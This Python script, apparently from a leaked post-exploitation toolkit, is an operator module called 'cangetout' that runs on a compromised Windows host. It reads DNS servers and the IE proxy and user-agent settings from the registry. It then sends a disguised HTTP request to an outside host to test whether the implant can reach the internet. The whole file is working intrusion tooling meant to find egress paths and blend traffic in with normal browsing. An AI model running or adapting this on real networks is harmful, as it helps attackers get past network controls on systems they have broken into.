
import dsz
import dsz.lp
import dsz.file
import os, sys, re
import base64, traceback
from optparse import OptionParser
import ops, ops.cmd, util.ip

class canGetOut:

    def __init__(self, options):
        self.ip = options.ipdst
        self.port = options.port
        self.domain = None
        self.userAgent = 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'
        self.proxy_ip = None
        self.proxy_port = None
        self.dns = []

    def main(self):
        self.getDNS()
        if self.ip:
            if (not re.match('(\\d{1,3}\\.){3}\\d{1,3}', self.ip)):
                dsz.ui.Echo('Resolving IP address...')
                self.domain = self.ip
                self.ip = self.nslookup(self.ip)
            else:
                self.domain = self.ip
        else:
            self.menu()
        if (self.ip and self.port):
            dsz.ui.Echo('Looking for IE Proxy Settings in the Registry...')
            self.proxy()
            dsz.ui.Echo('Getting User-Agent string from the registry...')
            self.getUserAgent()
            dsz.ui.Echo('Attempting to get out...')
            self.getOut()

    def menu(self):
        addrlist = ['www.microsoft.com', 'www.google.com', 'www.yahoo.com']
        dsz.ui.Echo('Choose an address...')
        for index in range(len(addrlist)):
            dsz.ui.Echo(('%d) %s' % ((index + 1), addrlist[index])))
        choice = dsz.ui.GetInt('Enter number:', '1')
        if ((choice <= 0) or (choice > len(addrlist))):
            dsz.ui.Echo('Invalid choice', dsz.ERROR)
        else:
            dsz.ui.Echo(('You chose: %s' % addrlist[(choice - 1)]))
            self.domain = addrlist[(choice - 1)]
            self.ip = self.nslookup(addrlist[(choice - 1)])

    def getDNS(self):
        cmd = ops.cmd.getDszCommand('ipconfig', dszquiet=True)
        obj = cmd.execute()
        try:
            for dnsserver in obj.fixeddataitem.dnsservers.dnsserver:
                self.dns.append(dnsserver.ip)
        except:
            dsz.ui.Echo('\tError getting dns servers', dsz.ERROR)

    def nslookup(self, name):
        cmd = ops.cmd.getDszCommand(('nameserverlookup %s' % name), dszquiet=True)
        obj = cmd.execute()
        if (not cmd.success):
            dsz.ui.Echo('\tError: Unable to complete remote nslookup', dsz.ERROR)
            return None
        for hostinfo in obj.hostinfo:
            if util.ip.validate_ipv4(hostinfo.info):
                dsz.ui.Echo(('\t%s' % hostinfo.info.strip()))
                return hostinfo.info.strip()
        return None

    def getUserAgent(self):
        cmd = ops.cmd.getDszCommand('registryquery -hive C', dszquiet=True)
        cmd.value = u'"User Agent"'
        cmd.key = u'"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"'
        obj = cmd.execute()
        if (not cmd.success):
            dsz.ui.Echo('\tUser Agent regquery failed', dsz.ERROR)
        self.userAgent = obj.key[0].value[0].value.strip()
        dsz.ui.Echo(('\tUser agent set to: %s' % self.userAgent))

    def proxy(self):
        cmd = ops.cmd.getDszCommand('registryquery -hive C', dszquiet=True)
        cmd.value = u'"ProxyEnable"'
        cmd.key = u'"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"'
        obj = cmd.execute()
        if (not cmd.success):
            dsz.ui.Echo('\tProxy registryquery failed', dsz.ERROR)
            return
        enabled = obj.key[0].value[0].value.strip()
        if (enabled == '1'):
            dsz.ui.Echo('\tProxy is currently ENABLED.  Querying registry for server')
            cmd.value = u'"ProxyServer"'
            obj = cmd.execute()
            if (not cmd.success):
                dsz.ui.Echo('\tFailed to get ProxyServer', dsz.ERROR)
                return
            server = obj.key[0].value[0].value.strip()
            dsz.ui.Echo(('\tProxy server is: %s' % str(server)))
            (self.proxy_ip, self.proxy_port) = server.strip().split(':')
        else:
            dsz.ui.Echo('\tIE Proxy currently DISABLED')

    def getOut(self):
        cmd = ops.cmd.getDszCommand('banner')
        if (self.proxy_ip and self.proxy_port):
            dsz.ui.Echo(('Proxy: %s:%s' % (self.proxy_ip, self.proxy_port)))
            choice = dsz.ui.Prompt('It appears a proxy is set.  Banner with proxy settings?')
            if (choice == 1):
                cmd = ops.cmd.getDszCommand('banner')
                cmd.optdict['ip'] = self.proxy_ip
                cmd.optdict['port'] = self.proxy_port
                cmd.optdict['wait'] = '5'
                cmd.optdict['send'] = ('"GET http://%s/ HTTP/1.0\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nProxy-Connection: Keep-Alive\\r\\n\\r\\n"' % (self.domain, self.domain, self.userAgent))
            else:
                cmd = ops.cmd.getDszCommand('banner')
                cmd.optdict['ip'] = self.ip
                cmd.optdict['port'] = self.port
                cmd.optdict['wait'] = '5'
                cmd.optdict['send'] = '"GET / HTTP/1.0\\r\\n\\r\\n"'
        else:
            cmd = ops.cmd.getDszCommand('banner')
            cmd.optdict['ip'] = self.ip
            cmd.optdict['port'] = self.port
            cmd.optdict['wait'] = '5'
            cmd.optdict['send'] = ('"GET / HTTP/1.0\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\n\\r\\n"' % (self.domain, self.userAgent))
        obj = cmd.execute()
        if (not cmd.success):
            dsz.ui.Echo(('\tCan not get out to %s:%s' % (self.ip, self.port)), dsz.ERROR)
            return
        if (len(obj.transfer) == 0):
            dsz.ui.Echo(("\tWe seem to have gotten a 'Timeout waiting for data', check CMDID %s" % obj.cmdid), dsz.WARNING)
            return
        response = obj.transfer[0].text.splitlines()[0]
        dsz.ui.Echo(('\t%s' % response))
        if (response.find('200 OK') != (-1)):
            dsz.ui.Echo('We can get out successfully!', dsz.GOOD)
        else:
            dsz.ui.Echo('Non 200 OK Response Received', dsz.WARNING)

def parseArgs():
    usage = 'cangetout -d <IP ADDRESS|FQDN> -p <PORT>'
    parser = OptionParser(usage=usage)
    parser.add_option('-d', dest='ipdst', type='string', action='store', default=None)
    parser.add_option('-p', dest='port', type='string', action='store', default='80')
    (options, args) = parser.parse_args(sys.argv)
    print usage
    if ((len(sys.argv) == 1) or ((options.ipdst or options.port) and (len(args) > 0))):
        canGetOut(options).main()
    else:
        dsz.ui.Echo('Exiting...')
        return
if (__name__ == '__main__'):
    parseArgs()